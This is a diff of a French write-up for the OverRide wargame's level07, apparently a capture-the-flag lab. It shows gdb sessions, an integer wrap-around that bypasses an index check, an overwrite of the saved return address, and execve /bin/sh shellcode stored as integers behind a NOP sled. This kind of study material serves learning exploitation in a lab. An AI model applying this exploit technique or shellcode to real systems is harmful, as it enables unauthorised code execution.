@@ -51,7 +51,7 @@ Input command: read
 Input command:
 
 
-On peut donc lire deppuis le tableau storage[100] 
+On peut donc lire plus loin que le tableau storage[100] 
 
     uint32_t storage[100]; // Array de 400 octets
 	ou
@@ -59,7 +59,13 @@ On peut donc lire deppuis le tableau storage[100]
 
 ebp-1B8h est plus stable donc on vas recuperer son addresse:
 
-(gdb) b *0x080487e0
+
+On brake au debut du code pour connaitre l'adr de ebp-1B8
+(gdb) disassemble main
+...
+   0x08048729 <+6>:	and    $0xfffffff0,%esp
+...
+(gdb) b *0x08048729
 Breakpoint 1 at 0x80487e0
 (gdb) run
 Starting program: /home/users/level07/level07
@@ -70,7 +76,7 @@ Breakpoint 1, 0x080487e0 in main ()
 (gdb)
 
 0xffffd550 est l'adresse de debut de storage ou on stock les int
-
+ou 4294956368  en decimal 
 
 (gdb) info frame
 Stack level 0, frame at 0xffffd710:
@@ -112,7 +118,7 @@ donc pour utiliser 111 on est bloquer
 mais on peut utiliser le wrap around pour contourner le check du modulo 3
 
 (x + 2^32) % 2^32 = x
-5+2^32 % 2^32 = 5
+5 + 2^32 % 2^32 = 5
 
 car si le calcul depasse 2^32-1 le registre ne peut pas stock le 33eme bits
 il est donc abandonne et le calcul boucle 
@@ -132,7 +138,7 @@ si on ajoute on veut passer a 16 normalement ca donnerais
 
  1  0 0 0 0
 
-mais le 1 est en dehor des 4 bits que le type de la variable peut gerer
+mais le 1 est en dehors des 4 bits que le type de la variable peut gerer
 donc 
 
 au lieu d'avoir ajouter 1 et d'etre passer de 15 a 16 
@@ -141,38 +147,33 @@ nous sommes passee de 15 a 0
 c'est ce qui se passe avec le wrap around
 
 
-2^32 c'est la valeur max que peut gerer le processeur
-quand il accede a une case d'un tableau: 
+2^32 c'est la valeur max que peut gerer le processeur quand il accede a une case d'un tableau: 
 	storage[index] = number
 le processeur fait un calcul: 
 	addresse de storage[index] = adresse de storage + (index * 4)
 
-Si l'on ajoute 2^30 à n'importe quel index, le produit par 4 
- entraînera une boucle exacte autour de l'espace d'adressage 32 bits 
- 2^30 * 4 = 2^32 = 0
+Si l'on ajoute 2^30 à n'importe quel index, le produit par 4 entraînera une boucle exacte autour de l'espace d'adressage 32 bits 2^30 * 4 = 2^32 = 0
 
 2^32 / 4 = 2^30 = 1073741824
 
 111 + 2^30 = 111 + 1073741824 = 1073741935
 
-et 
+Donc 1073741935 permet donner 111 en bypassant le check du programme
 
-Offset calculé par le processeur = (1073741935 * 4) 2^32 = 
- 4294967740 (% 4294967296(qui est 1073741824*4)) = 444octets
+Offset = (1073741935 * 4) % 4294967296(1073741824*4) = 444 octets / 4 = 111
 
 1073741935 % 3 == 1 et != 0
 
 donc on a notre index 1073741935(111 avec bypass du %3)
 
-il nous faut une adresse ne commençant pas par 0xB7 ou est generalement stocker la libc donc on peut essayer de passer par une var d'env.
+il nous faut une adresse ne commençant pas par 0xB7 (ou est generalement stocker la libc) on peut passer par une var d'env.
 
 mais ca ne fonctionne pas car le code efface les var d'env en mémoire
 
     for (; *envp != NULL; envp++)
         memset(*envp, 0, strlen(*envp));
 
-donc on peut transformer notre shellcode en int qu'on peut stocker 
- dans le tableau storage.
+donc on peut transformer notre shellcode en int qu'on peut stocker dans le tableau storage.
 
 \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
 24/4 = 6
@@ -203,12 +204,24 @@ donc wrap around:
 5			2160921520
 
 entre temps l'adresse de storage a change
+(gdb) disassemble main
+...
+   0x08048729 <+6>:	and    $0xfffffff0,%esp
+...
+(gdb) b *0x08048729
+Breakpoint 1 at 0x80487e0
+(gdb) run
+Starting program: /home/users/level07/level07
+
+Breakpoint 1, 0x080487e0 in main ()
 (gdb) x/wx $ebp-0x1b8
 0xffffd510:     0x00000000
+
+https://www.rapidtables.com/convert/number/hex-to-decimal.html
 0xffffd510 == 4294956304
 
-on stock l'adresse du debut du tableau (4294956304) a la place de eip (index 111 == 1073741935)
 
+on stock l'adresse du debut du tableau (4294956304) a la place de eip (index 111 == 1073741935)
 
 level07@OverRide:~$ ./level07
 ...
@@ -221,14 +234,14 @@ level07@OverRide:~$
 
 eip n'est pas a l'index 111 car il n'y a aucun segfault quand on quit.
 
-en parcourant tout les index autour on tombe sur 114
 
 Input command: read
  Index: 114
  Number at data[114] is 4158936339
  Completed read command successfully
 
-il contient 4158936339 qui en hexa donne F7E45513 qui est une adre valable c'est a l'index 114 qu'il y a surement eip 
+En parcourant tout les index autour on tombe sur 114
+il contient 4158936339 qui en hexa donne F7E45513 qui est une addresse valable c'est a l'index 114 qu'il y a surement eip 
 
 114 + 2^30 = 114 + 1073741824 = 1073741938
 
@@ -240,13 +253,17 @@ Input command: quit
 Segmentation fault (core dumped)
 level07@OverRide:~$
 
-c'est bon on reessaye
-on stock l'adresse du debut du tableau (4294956304) a la place de eip (index 114 == 1073741938)
+
+pour etre au milieu du NOP sled et pouvoir glisser a coup sure
+4294956304 + 30*4 = 4294956304 + 120 = 4294956424
+
+C'est bon le programme segfault on a ecrit au bon endroit.
+on stock l'adresse du debut du tableau (4294956424) a la place de eip (index 114 == 1073741938)
 
 level07@OverRide:~$ ./level07
 ...
 Input command: store
- Number: 4294956304
+ Number: 4294956424
  Index: 1073741938
  Completed store command successfully
 Input command: quit
@@ -262,7 +279,7 @@ inversion de l'ordre des octets (Endianness)
 hexa to dec
 2425393296
 
-et on vas creer un script pour simplifier la rentree des infos 
+et on vas creer un script pour simplifier la saisie des infos 
 
 
 level07@OverRide:~$ (python /tmp/sc.py; cat) | ./level07
